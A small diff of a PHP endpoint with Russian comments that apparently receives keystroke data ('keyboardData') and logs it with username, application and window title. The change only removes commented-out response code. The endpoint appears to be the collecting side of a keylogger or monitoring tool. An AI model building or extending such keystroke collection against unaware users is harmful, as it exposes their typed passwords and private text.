@@ -29,13 +29,4 @@ if (!isset($data['keyboardData'])) {
 // Обрабатываем полученные данные
 $key_pressed = $data['keyboardData'];
 
-// Дальнейшая обработка данных...
-
-// Отправляем ответ
-//http_response_code(200); // OK
-//echo "\nДанные успешно получены: " . $key_pressed;
-
-
-
 createNewLog($username, $application, $application_title, $key_pressed);
-
